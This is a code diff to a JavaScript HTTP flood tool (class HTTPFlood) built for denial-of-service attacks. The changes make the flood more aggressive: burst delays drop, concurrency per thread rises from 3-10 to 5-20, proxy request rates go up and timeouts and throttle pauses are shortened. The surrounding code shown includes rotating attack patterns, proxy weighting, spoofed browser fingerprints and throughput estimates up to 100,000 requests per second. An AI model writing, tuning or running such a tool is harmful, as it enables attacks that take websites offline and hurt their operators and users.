@@ -469,8 +469,8 @@ function rotateAttackPattern() {
     // Return delay based on pattern
     switch (config.attackPattern) {
         case 'burst': return 0;
-        case 'steady': return 50;
-        case 'mixed': return Math.random() > 0.5 ? 0 : 25;
+        case 'steady': return 10; // Reduced from 50ms
+        case 'mixed': return Math.random() > 0.7 ? 0 : 5; // Reduced from 25ms
         default: return 0;
     }
 }
@@ -898,8 +898,8 @@ class HTTPFlood {
         console.log(`${colors.blue}${icons.target} Target: ${colors.bright}${this.url}${colors.reset}`);
         console.log(`${colors.magenta}${icons.clock} Duration: ${colors.bright}${this.duration}s${colors.reset} ${colors.dim}│${colors.reset} ${colors.green}${icons.fire} Threads: ${colors.bright}${this.threads}${colors.reset}`);
         console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
-        console.log(`${colors.green}${icons.success} Mode: ${colors.bright}ADAPTIVE${colors.reset}${colors.green} (3-10 concurrent/thread, auto-tuned)${colors.reset}`);
-        console.log(`${colors.yellow}${icons.fire} Pattern: ${colors.bright}Rotating${colors.reset}${colors.yellow} (burst→steady→mixed, 30s cycles)${colors.reset}`);
+        console.log(`${colors.green}${icons.success} Mode: ${colors.bright}ADAPTIVE${colors.reset}${colors.green} (5-20 concurrent/thread, auto-tuned)${colors.reset}`);
+        console.log(`${colors.yellow}${icons.fire} Pattern: ${colors.bright}Rotating FAST${colors.reset}${colors.yellow} (burst→steady→mixed, 30s cycles)${colors.reset}`);
         console.log(`${colors.magenta}${icons.check} Proxies: ${colors.bright}Weighted selection${colors.reset}${colors.magenta} (best 3x more likely)${colors.reset}`);
         console.log(`${colors.blue}${icons.info} Recovery: ${colors.bright}Exponential backoff${colors.reset}${colors.blue} + 30s temp bans${colors.reset}`);
         console.log(`${colors.cyan}${icons.success} Session: ${colors.bright}Cookie tracking${colors.reset}${colors.cyan} + 10 redirects + realistic navigation${colors.reset}`);
@@ -907,7 +907,7 @@ class HTTPFlood {
         console.log(`${colors.magenta}${icons.check} Fingerprint: ${colors.bright}5 Browser Profiles${colors.reset}${colors.magenta} (randomized per thread)${colors.reset}`);
         console.log(`${colors.yellow}${icons.check} Connection: ${colors.bright}${config.proxies.length > 0 ? '2048' : '1024'} socket pool${colors.reset}${colors.yellow} + Keep-Alive${colors.reset}`);
         
-        const baseRPS = config.proxies.length > 0 ? 250 : 500;
+        const baseRPS = config.proxies.length > 0 ? 400 : 500;
         const estimatedRPS = Math.min(this.threads * baseRPS, config.maxRPS || (config.proxies.length > 0 ? 50000 : 100000));
         console.log(`${colors.cyan}${'─'.repeat(70)}${colors.reset}`);
         console.log(`${colors.bright}${colors.green}${icons.fire} Estimated Throughput: ${colors.yellow}${estimatedRPS.toLocaleString()}${colors.reset}${colors.green} - ${colors.yellow}${Math.min((estimatedRPS * 1.5), config.maxRPS || 999999).toLocaleString()}${colors.reset}${colors.green} req/s${colors.reset}`);
@@ -954,7 +954,7 @@ class HTTPFlood {
         const profile = getRandomElement(BROWSER_PROFILES);
         const useProxy = config.proxies.length > 0;
         const isHttpsTarget = this.url.startsWith('https://');
-        let concurrency = 3; // Adaptive: starts at 3, can go 3-10
+        let concurrency = 5; // Adaptive: starts at 5, can go 5-20
         
         const endTime = Date.now() + this.duration * 1000;
         
@@ -1033,7 +1033,7 @@ class HTTPFlood {
                     method: this.method.toLowerCase(),
                     url: targetUrl,
                     headers,
-                    timeout: useProxy ? 10000 : 5000,
+                    timeout: useProxy ? 7000 : 5000, // Reduced from 10000ms
                     maxRedirects: 10, // Follow all redirects
                     validateStatus: () => true,
                     decompress: true,
@@ -1169,12 +1169,12 @@ class HTTPFlood {
             if (localCount > 0 && localCount % 50 === 0) {
                 const currentSuccessRate = (successCount / localCount) * 100;
                 
-                if (currentSuccessRate > 85 && concurrency < 10) {
+                if (currentSuccessRate > 85 && concurrency < 20) {
                     concurrency++;
                     if (config.debug) {
                         console.log(`[ADAPTIVE] T${threadId}: Increased concurrency to ${concurrency} (${currentSuccessRate.toFixed(1)}% success)`);
                     }
-                } else if (currentSuccessRate < 50 && concurrency > 3) {
+                } else if (currentSuccessRate < 50 && concurrency > 5) {
                     concurrency--;
                     if (config.debug) {
                         console.log(`[ADAPTIVE] T${threadId}: Decreased concurrency to ${concurrency} (${currentSuccessRate.toFixed(1)}% success)`);
@@ -1205,7 +1205,7 @@ class HTTPFlood {
                 const elapsed = (Date.now() - config.stats.startTime) / 1000;
                 const currentRate = config.stats.totalRequests / elapsed;
                 if (currentRate > config.maxRPS) {
-                    await new Promise(resolve => setTimeout(resolve, 30));
+                    await new Promise(resolve => setTimeout(resolve, 10)); // Reduced from 30ms
                 }
             }
         }
